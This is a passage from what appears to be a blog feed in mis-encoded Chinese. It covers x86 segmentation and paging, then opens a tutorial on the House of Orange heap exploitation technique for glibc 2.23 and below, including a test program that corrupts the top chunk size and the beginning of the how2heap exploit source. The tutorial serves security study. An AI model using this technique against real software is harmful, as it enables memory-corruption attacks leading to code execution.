·å–å‡ºæ¥çš„çº¿æ€§åœ°å€å°±æ˜¯æˆ‘ä»¬çš„ç‰©ç†åœ°å€</p><p>å–å‡ºä¸€æ¬¡åä¼šæ”¾å…¥ç¨‹åºå‘˜ä¸å¯è§éƒ¨åˆ†â€”æ®µæè¿°ç¬¦ç¼“å†²å¯„å­˜å™¨ï¼ˆ Descriptor Cache Registers ),ä¸‹æ¬¡ä¼šç›´æ¥ä»è¿™é‡Œé¢å–ï¼Œï¼Œåªè¦å¾€æ®µå¯„å­˜å™¨ä¸­èµ‹å€¼ï¼Œ CPU å°±ä¼šæ›´æ–°æ®µæè¿°ç¬¦ç¼“å†²å¯„å­˜å™¨</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200014884.png" alt="image-20230420200014884"></p><h4 id="linuxä¸­çš„åˆ†æ®µæœºåˆ¶"><a href="#linuxä¸­çš„åˆ†æ®µæœºåˆ¶" class="headerlink" title="linuxä¸­çš„åˆ†æ®µæœºåˆ¶"></a>linuxä¸­çš„åˆ†æ®µæœºåˆ¶</h4><p>RISCå¯¹åˆ†æ®µæ”¯æŒæœ‰é™ï¼Œlinuxä¸ºäº†æ›´å¥½çš„ç§»æ¤æ€§ï¼Œç®€åŒ–äº†åˆ†æ®µæœºåˆ¶ï¼Œåœ¨åˆå§‹åŒ–æ—¶å°±æŠŠæ®µæè¿°ç¬¦é‡Œçš„åŸºåœ°å€è®¾ä¸º0ï¼Œæ®µè¾¹ç•Œè®¾ç½®ä¸º0xfffffï¼Œæ¯ä¸ªæ®µéƒ½èƒ½è®¿é—®4G</p><h3 id="åˆ†é¡µæœºåˆ¶"><a href="#åˆ†é¡µæœºåˆ¶" class="headerlink" title="åˆ†é¡µæœºåˆ¶"></a>åˆ†é¡µæœºåˆ¶</h3><p>åˆ†æ®µä¼šé€ æˆä¸€äº›é—®é¢˜</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408194444921.png" alt="image-20230408194444921"></p><ul><li><p>è¿™æ ·ä¸€ä¸ªåˆ†æ®µå†…å­˜ï¼Œå¦‚æœæ­¤æ—¶BDç¨‹åºåœæ­¢ï¼Œæ­¤æ—¶å¦‚æœæœ‰ä¸€ä¸ªç¨‹åºFå 3ä¸ªå†…å­˜å—ï¼Œè™½ç„¶å†…å­˜é‡Œç”±ä¸‰ä¸ªç©ºé—²å†…å­˜ï¼Œä½†æ˜¯å´ä¸æ˜¯è¿ç»­çš„æ— æ³•åŠ è½½æˆ‘ä»¬çš„ç¨‹åºFï¼Œæ—¶é—´é•¿äº†ä¼šé€ æˆå¤§é‡å†…å­˜ç¢ç‰‡ï¼Œ</p></li><li><p>å¦ä¸€ä¸ªé—®é¢˜æ˜¯ç¨‹åºè·‘èµ·æ¥åæœ‰äº›ä»£ç å’Œæ•°æ®å¯èƒ½å¾ˆä¹…éƒ½ä¸ä¼šç”¨åˆ°ï¼Œä½†æ˜¯åœ¨åˆ†æ®µä¸‹æˆ‘ä»¬è¿˜å¿…é¡»åŠ è½½åˆ°å†…å­˜ï¼Œé€ æˆå†…å­˜æµªè´¹</p></li><li><p>åˆ†æ®µä¸‹æˆ‘ä»¬æ²¡åŠæ³•åŠ¨æ€åˆ†é…æˆ‘ä»¬ç¨‹åºçš„å†…å­˜ï¼Œå› ä¸ºåœ¨åˆ†æ®µä¸‹åŠ è½½åˆ°å†…å­˜çš„å—å¤§å°æ˜¯å¿…é¡»è¦æå‰è®¡ç®—å¥½çš„</p></li><li><p>ç‰©ç†å†…å­˜å¤ªå°æ—¶ï¼Œç¨‹åºå°±ä¸èƒ½åŠ è½½</p></li></ul><p>åœ¨åˆ†æ®µçš„å‰æä¸Šåœ¨åŠ ä¸€å±‚ä¸œè¥¿</p><p>åˆ†é¡µæŠŠçº¿æ€§åœ°å€å’Œç‰©ç†åœ°å€ç©ºé—´éƒ½åˆ’åˆ†ä¸ºé¡µé¢ï¼Œlinuxä¸€èˆ¬ä½¿ç”¨4kå¤§å°çš„é¡µé¢ï¼Œåˆ†é¡µæœºåˆ¶çš„ä¸»è¦ç›®çš„æ˜¯é«˜æ•ˆåœ°åˆ©ç”¨å†…å­˜ï¼ŒæŒ‰é¡µæ¥ç»„ç»‡å’Œç®¡ç†å†…å­˜ç©ºé—´ï¼ŒæŠŠæš‚æ—¶ä¸ç”¨çš„æ•°æ®äº¤æ¢åˆ°ç©ºé—´è¾ƒå¤§çš„å¤–éƒ¨å­˜å‚¨å™¨ï¼ˆé€šå¸¸æ˜¯ç¡¬ç›˜ï¼‰ä¸Šï¼ˆç§°ä¸ºpage outï¼Œæ¢å‡ºï¼‰ï¼Œéœ€è¦æ—¶å†äº¤æ¢å›æ¥ï¼ˆç§°ä¸ºpage inï¼Œæ¢è¿›ï¼‰åŒæ—¶ï¼Œå¯ä»¥å°†é€»è¾‘ä¸Šè¿ç»­çš„çº¿æ€§åœ°å€æ˜ å°„çš„ç‰©ç†åœ°å€å¯ä»¥ä¸è¿ç»­ï¼ŒæŠŠå†…å­˜ç¢ç‰‡åˆ©ç”¨èµ·æ¥ã€‚ç°ç”¨ç°æ˜ å°„ï¼Œä¸ç”¨ä¸æ˜ å°„ï¼Œæ‰€ä»¥ä»ç†è®ºä¸Šï¼Œæˆ‘ä»¬åªéœ€è¦8kçš„å†…å­˜å°±å¯ä»¥è·‘ä¸€ä¸ªç¨‹åºï¼Œ4kæ•°æ®ï¼Œ4kä»£ç ï¼Œä¸æ–­è¿›è¡Œå†…å­˜å’Œç¡¬ç›˜çš„è½¬æ¢</p><p>æ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿå†…å­˜ä¹Ÿæ˜¯åˆ©ç”¨åˆ†é¡µæ¥å®ç°çš„</p><p>CROå¯„å­˜å™¨çš„PGä¸ºä¸º1æ—¶å¼€å¯åˆ†é¡µ</p><p><strong>åˆ›å»ºè¿›ç¨‹æ—¶ï¼Œå°±ä¼šä¸ºè¿™ä¸ªè¿›ç¨‹åˆ›å»ºé¡µè¡¨ï¼Œè¿›ç¨‹ç©ºé—´éš”ç¦»ä¸»è¦å› ä¸ºæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€å¥—ç›¸å¯¹ç‹¬ç«‹çš„é¡µè¡¨,æ˜ å°„è¿‡çš„ç‰©ç†å†…å­˜ä¼šåœ¨é¡µè¡¨é‡Œç™»è®°è¿™ä¸ªæ˜ å°„å…³ç³»ï¼Œè¿›ç¨‹çš„åˆ‡æ¢ä¼šä¼´éšç€é¡µè¡¨çš„åˆ‡æ¢</strong></p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195713371.png" alt="image-20230420195713371"></p><p>CR3å¯„å­˜å™¨ä¾¿æ˜¯ç”¨æ¥è®°å½•å½“å‰ä»»åŠ¡çš„é¡µè¡¨ç‰©ç†åœ°å€ã€‚</p><h4 id="ä¸€çº§é¡µè¡¨"><a href="#ä¸€çº§é¡µè¡¨" class="headerlink" title="ä¸€çº§é¡µè¡¨"></a>ä¸€çº§é¡µè¡¨</h4><p>åªæœ‰ä¸€çº§é¡µè¡¨çš„è¯éœ€è¦æœ‰2^20æ¬¡æ–¹ä¸ªè¡¨é¡¹ï¼Œè¡¨é¡¹é‡Œç”¨4ä¸ªå­—èŠ‚å­˜æ”¾é¡µé¢çš„å¼€å§‹ç‰©ç†åŸºåœ°å€ï¼Œç”±äºé¡µæ—¶4kå¤§å°å¯¹é½ï¼Œæ‰€ä»¥ä½12ä½å§‹ç»ˆä¸º0ï¼Œä¸ç”¨è®°å½•ï¼Œä½åäºŒä½ç”¨æ¥å­˜æ”¾ä¸€äº›æƒé™ä¿¡æ¯</p><p>æˆ‘ä»¬ç”¨çº¿æ€§åœ°å€çš„é«˜20ä½å»ç´¢å¼•é¡µè¡¨æ•°ç»„ï¼Œå†åŠ ä¸Šçº¿æ€§åœ°å€çš„ä½12ä½åç§»å°±å¯ä»¥å¾—åˆ°ç‰©ç†åœ°å€</p><p>ä¸€çº§é¡µè¡¨çš„ç¼ºç‚¹æ˜¯ï¼Œ2^20æ¬¡æ–¹ä¸ª4å­—èŠ‚çš„è¡¨é¡¹éœ€è¦4Mçš„è¿ç»­ç‰©ç†å†…å­˜å»å­˜å‚¨ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªå•ç‹¬çš„é¡µè¡¨ï¼Œnä¸ªè¿›ç¨‹ï¼Œ4*nMçš„å†…å­˜æ¶ˆè€—å¤ªå¤§</p><h4 id="32ä½ç»å…¸åˆ†é¡µ"><a href="#32ä½ç»å…¸åˆ†é¡µ" class="headerlink" title="32ä½ç»å…¸åˆ†é¡µ"></a>32ä½ç»å…¸åˆ†é¡µ</h4><p><strong>äºŒçº§é¡µè¡¨</strong></p><p>CR0çš„PGæ ‡å¿—ä¸º1ã€CR4çš„PAEä¸º0æ—¶ï¼Œä½¿ç”¨è¿™ä¸ªæ¨¡å¼ï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œé¡µè¡¨ç»“æ„ä¸ºä¸¤çº§ï¼Œç¬¬ä¸€çº§ç§°ä¸ºé¡µç›®å½•è¡¨ï¼ˆPage Directory Tableï¼‰ï¼Œç¬¬äºŒçº§ç§°ä¸ºé¡µè¡¨ï¼ˆPage Table)ï¼Œæœ€ç»ˆå±æ€§çš„æ˜¯ç”±é¡µç›®å½•é¡¹å’Œé¡µè¡¨é¡¹ç›¸ä¸(PDE&amp;PTE)æ¥å†³å®šçš„<br>é¡µç›®å½•å­˜æ”¾åœ¨ä¸€ä¸ª4Kå¤§å°çš„é¡µé¢ä¸Šï¼Œå­˜æ”¾1024ä¸ªæŒ‡å‘ä¸€ä¸ªäºŒçº§é¡µè¡¨åœ°å€ï¼ŒäºŒçº§é¡µè¡¨å¤§å°ä¹Ÿæ˜¯ä¸€ä¸ªé¡µé¢ï¼Œæœ€å¤šå«æœ‰1Kä¸ª4å­—èŠ‚é¡µè¡¨é¡¹(Page-Table Entryï¼ŒPTE)</p><p>æ¯ä¸ªäºŒçº§é¡µè¡¨å­˜æ”¾1024ä¸ªç‰©ç†é¡µçš„åœ°å€ï¼Œ1024*4KB&#x3D;4MBï¼Œ1024ä¸ªäºŒçº§é¡µè¡¨1024*4MB&#x3D;4GB,æ»¡è¶³4Gå¯»å€</p><p>ç›®å½•é¡¹</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195930886.png" alt="image-20230420195930886"></p><p>é¡µè¡¨é¡¹</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195952065.png" alt="image-20230420195952065"></p><p>æŸ¥æ‰¾è¿‡ç¨‹</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420191045242.png" alt="image-20230420191045242"></p><ol><li>é€šè¿‡CR3å¯„å­˜å™¨å®šä½åˆ°é¡µç›®å½•çš„èµ·å§‹åœ°å€,å–çº¿æ€§åœ°å€çš„é«˜10ä½x4ä½œä¸ºç´¢å¼•é€‰å–é¡µç›®å½•çš„ç›®å½•é¡¹(ç”±äºä¸€ä¸ªç›®å½•é¡¹æ˜¯4å­—èŠ‚ï¼Œæ‰€ä»¥x4)</li><li>é‚£ä¹ˆæ ¹æ®é¡µç›®å½•é¡¹ä¸­çš„é¡µè¡¨åŸºåœ°å€(é«˜20ä½)å’Œä½12ä½ä¸º0ï¼Œå®šä½åˆ°äºŒçº§é¡µè¡¨</li><li>å–çº¿æ€§åœ°å€çš„12ä½åˆ°21ä½ï¼ˆå…±10ä½ï¼‰x4ï¼Œä½œä¸ºç´¢å¼•é€‰å–äºŒçº§é¡µè¡¨çš„ä¸€ä¸ªé¡µè¡¨é¡¹</li><li>å–å‡ºé¡µè¡¨é¡¹çš„é¡µè¡¨åŸºåœ°å€</li><li>å–çº¿æ€§åœ°å€çš„ä½12ä½ä½œä¸ºé¡µä¸­åç§»å’Œä¸Šä¸€æ­¥åŸºåœ°å€ç›¸åŠ å¾—åˆ°ç‰©ç†åœ°å€</li></ol><blockquote><p>è¿™ä¸ªæ—¶å€™ä¸€æƒ³ï¼Œ4kå¤§å°çš„äºŒçº§é¡µè¡¨æœ‰1024ä¸ªï¼Œè¿˜å¤–åŠ ä¸€ä¸ª4kç›®å½•è¡¨è¿™ä¸æ¯”ä¹‹å‰çš„4Mè¿˜å¤§4kï¼Ÿ</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åˆ†æä¸‹ç›®å½•é¡¹çš„ä½œç”¨</p><ol><li>é¡µç›®å½•é¡¹çš„Pä½è¡¨ç¤ºæ˜¯å¦åœ¨ç‰©ç†å†…å­˜ï¼Œè¿™å°±è¯´æ˜äºŒçº§é¡µè¡¨æœ¬èº«ä¹Ÿå¯èƒ½è¢«äº¤æ¢åˆ°è™šæ‹Ÿå†…å­˜ä¸­ï¼Œåªæœ‰ä¸€éƒ¨åˆ†éœ€è¦çš„äºŒçº§é¡µè¡¨è¢«åŠ è½½åˆ°ç‰©ç†å†…å­˜ï¼Œå…¶ä½™å¯ä»¥æ”¾åˆ°ç£ç›˜ï¼Œç›®å½•é¡¹çš„å¦‚æœPä½ä¸º0ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œç¼ºé¡µå¼‚å¸¸è°ƒç”¨å†…æ ¸ä¸­çš„ç¼ºé¡µå¼‚å¸¸å¤„ç†ç¨‹åºæŠŠéœ€è¦çš„é¡µé¢æ˜ å°„åˆ°ç‰©ç†å†…å­˜</li><li>æœ‰äº†è¿™ä¸ªæœºåˆ¶æˆ‘ä»¬å¯ä»¥æŠŠé¡µè¡¨åˆ†æ•£åˆ°ç‰©ç†å†…å­˜ä¸åŒä½ç½®ï¼Œè€Œä¸æ˜¯åœ¨ä¸€å—è¿ç»­çš„4Mç‰©ç†å†…å­˜ç©ºé—´</li><li>4kçš„é¡µç›®å½•æ˜¯ä¸€ç›´åœ¨ç‰©ç†å†…å­˜ä¸Šçš„</li></ol><p>å¤šçº§é¡µè¡¨çš„åå¤„åœ¨äºtlbä¸å‘½ä¸­å¤„ç½šåŠ å‰§ï¼ŒäºŒçº§é¡µè¡¨å°±éœ€è¦ä¸¤æ¬¡è®¿å­˜ï¼Œä¸€æ¬¡ç”¨äºé¡µç›®å½•ï¼Œå¦ä¸€æ¬¡ç”¨äº PTE æœ¬èº«</p></blockquote><h4 id="è¿™ç§åœ°å€è½¬æ¢éƒ½æ˜¯ç¡¬ä»¶æ¥è‡ªåŠ¨å®Œæˆçš„ï¼Œæ“ä½œç³»ç»Ÿæ¥å¤„ç†ç¼ºé¡µ"><a href="#è¿™ç§åœ°å€è½¬æ¢éƒ½æ˜¯ç¡¬ä»¶æ¥è‡ªåŠ¨å®Œæˆçš„ï¼Œæ“ä½œç³»ç»Ÿæ¥å¤„ç†ç¼ºé¡µ" class="headerlink" title="è¿™ç§åœ°å€è½¬æ¢éƒ½æ˜¯ç¡¬ä»¶æ¥è‡ªåŠ¨å®Œæˆçš„ï¼Œæ“ä½œç³»ç»Ÿæ¥å¤„ç†ç¼ºé¡µ"></a>è¿™ç§åœ°å€è½¬æ¢éƒ½æ˜¯ç¡¬ä»¶æ¥è‡ªåŠ¨å®Œæˆçš„ï¼Œæ“ä½œç³»ç»Ÿæ¥å¤„ç†ç¼ºé¡µ</h4><h2 id="64ä½linuxå†…å­˜åˆ†é¡µ"><a href="#64ä½linuxå†…å­˜åˆ†é¡µ" class="headerlink" title="64ä½linuxå†…å­˜åˆ†é¡µ"></a>64ä½linuxå†…å­˜åˆ†é¡µ</h2><p>ç›®å‰64ä½linuxåŸºæœ¬ä¸Šéƒ½é‡‡ç”¨å››çº§åˆ†é¡µæ¨¡å‹</p><ul><li>PGDï¼špage Global directory(47-39), é¡µå…¨å±€ç›®å½•</li><li>PUDï¼šPage Upper Directory(38-30)ï¼Œé¡µä¸Šçº§ç›®å½•</li><li>PMDï¼špage middle directory(29-21)ï¼Œé¡µä¸­é—´ç›®å½•</li><li>PTEï¼špage table entry(20-12)ï¼Œé¡µè¡¨é¡¹</li></ul><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230826213151091.png" alt="image-20230826213151091"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Protected Mode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House Of Orange 2.23 and below</title>
      <link href="/2023/04/06/House-of-orange/"/>
      <url>/2023/04/06/House-of-orange/</url>
      
        <content type="html"><![CDATA[<h2 id="House-Of-Orange-glibc-version-2-23-and-below"><a href="#House-Of-Orange-glibc-version-2-23-and-below" class="headerlink" title="House Of Orange glibc version 2.23 and below"></a>House Of Orange glibc version 2.23 and below</h2><p>å¾ˆå·§å¦™ç²¾ç»†çš„æ”»å‡»æ€è·¯ï¼Œæ ¸å¿ƒå’Œç²¾å½©ä¹‹å¤„æ˜¯åœ¨æ²¡æœ‰freeå‡½æ•°æ—¶å¦‚ä½•è¿›è¡Œheap attack</p><p>å…ˆçœ‹ä¸€ä¸‹åç§»æŠŠ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">FILE struct size: 0xd8</span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">chain - fp: 0x68</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">mode - fp: 0xc0</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">write_ptr - fp: 0x28</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">write_base - fp: 0x20</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">vtable_offset - fp: 0x82</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">read_ptr - fp: 0x8</span></span><br></pre></td></tr></table></figure><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>å½“å‰å †çš„top chunk å°ºå¯¸ä¸è¶³ä»¥æ»¡è¶³ç”³è¯·åˆ†é…çš„å¤§å°çš„æ—¶å€™ï¼ŒåŸæ¥çš„ top chunkä¼šè¢«é‡Šæ”¾å¹¶è¢«ç½®å…¥unsorted binä¸­ï¼Œé€šè¿‡è¿™ä¸€ç‚¹å¯ä»¥åœ¨æ²¡æœ‰ free å‡½æ•°æƒ…å†µä¸‹è·å–åˆ° unsorted binsã€‚</p><p>_int_mallocä¸­ä¾æ¬¡æ£€éªŒ fastbinã€small binsã€unsorted binã€large bins æ˜¯å¦å¯ä»¥æ»¡è¶³åˆ†é…è¦æ±‚ï¼Œæ²¡æœ‰çš„è¯,æ¥ä¸‹æ¥æ“ä½œtopchunk,è¿˜ä¸æ»¡è¶³çš„è¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sysmallocå»å‘æ“ä½œç³»ç»Ÿç”³è¯·ï¼Œæœ‰ mmap å’Œ brk ä¸¤ç§åˆ†é…æ–¹å¼ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯brkæå‡å †é¡¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ†é…çš„ chunk å¤§å°è¦å°äº mmap åˆ†é…é˜ˆå€¼ï¼Œé»˜è®¤ä¸º 128K</p><p>brkæ—¶ä¼šå¯¹top chunk size æ£€æµ‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"></span><br><span class="line">  old_top = av-&gt;top;<span class="comment">//avæ—¶main_areanï¼Œå–top chunkæœ€é«˜å¤„</span></span><br><span class="line">  old_size = chunksize (old_top);<span class="comment">//top chunk å¤§å°</span></span><br><span class="line">  old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size)); <span class="comment">//oldtop+oldsize</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||<span class="comment">//==0æ˜¯è¯´æ˜ç¬¬ä¸€æ¬¡mallocæ—¶</span></span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>è¦æ±‚æˆ‘ä»¬</p><ol><li>ä¼ªé€ çš„ size å¿…é¡»è¦å¯¹é½åˆ°å†…å­˜é¡µ(ä¸€èˆ¬4k),å› ä¸ºtopchunk+sizeæ˜¯æœ€åä¸€ä¸ªå †å—çš„è¾¹ç•Œ</li><li>size è¦å¤§äº MINSIZE(0x10)</li><li>size è¦å°äºä¹‹åç”³è¯·çš„ chunk size + MINSIZE(0x10)</li><li>size çš„ prev inuse ä½å¿…é¡»ä¸º 1</li></ol><p>æµ‹è¯•</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fake_size 0xfd1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    ptr=(<span class="type">void</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">40</span>);<span class="comment">//0x20+8=40åˆ°topchunkçš„size</span></span><br><span class="line"></span><br><span class="line">    *((<span class="type">long</span> <span class="type">long</span>*)ptr)=fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>malloc(0x20)</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151240973.png" alt="image-20230406151240973"></p><p>0x602030+0x20fd0&#x3D;0x623000 4kå¯¹é½çš„ï¼Œä¸ºäº†æ»¡è¶³<code>(unsigned long) old_end &amp; (pagesize - 1)) == 0)</code>æˆ‘ä»¬ä¼ªé€ çš„sizeè¦æ—¶0xfd1 0x1fd1 0x2fd1ç­‰ç­‰</p><p><code>    *((long long*)ptr)=fake_size;</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151445090.png" alt="image-20230406151445090"></p><p><code>malloc(0x1000)</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151803663.png" alt="image-20230406151803663"></p><p> <code>malloc(0x60);</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406152257567.png" alt="image-20230406152257567"></p><p><img src="/2023/04/06/House-of-orange/image-20230406152317119.png" alt="image-20230406152317119"></p><h3 id="how2heap-example"><a href="#how2heap-example" class="headerlink" title="how2heap example"></a>how2heap example</h3><p><strong>mdï¼Œè¿™ä¸ªæ³¨é‡Šå†™çš„å¤ªå¥½äº†orz</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span></span><br><span class="line"><span class="comment">  It requires a leak of the heap and the libc</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This function is just present to emulate the scenario where</span></span><br><span class="line"><span class="comment">   the address of the function system is known.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be 